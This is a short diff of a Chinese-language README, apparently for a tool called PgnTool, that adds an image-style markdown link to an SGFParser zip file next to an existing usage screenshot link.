@@ -28,3 +28,6 @@ command + ; 再次打开Project Structure
 使用![使用](https://github.com/Darksiderlyd/PgnTool/raw/lyd/image/使用.png)
 
 
+SGFParser![SGFParser](https://github.com/Darksiderlyd/PgnTool/raw/lyd/image/SGFParser.zip)
+
+
